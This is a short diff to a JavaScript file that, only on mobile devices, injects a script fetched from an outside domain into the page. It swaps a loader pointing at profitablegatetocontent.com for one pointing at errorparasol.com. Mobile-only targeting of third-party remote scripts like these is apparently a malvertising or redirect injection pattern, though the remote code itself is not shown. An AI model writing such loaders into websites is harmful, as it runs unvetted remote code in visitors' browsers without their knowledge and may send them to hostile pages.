@@ -3,5 +3,8 @@ if (screen.width < 500 ||
  navigator.userAgent.match(/webOS/i) ||
  navigator.userAgent.match(/iPhone/i) ||
  navigator.userAgent.match(/iPod/i)){
-	(function(s,u,z,p){s.src=u,s.setAttribute('data-zone',z),p.appendChild(s);})(document.createElement('script'),'//pl17724469.profitablegatetocontent.com/bd/1f/b7/bd1fb743bfb7d5cef08c5fefbe0ba1af.js',document.body||document.documentElement);
+	 
+	(function(s,u,p){s.src=u,p.appendChild(s);})(document.createElement('script'),'https://errorparasol.com/27/dc/29/27dc29b6be84e2684f60f0ad1ff03b44.js',document.body||document.documentElement)
 	 }
+	 
+
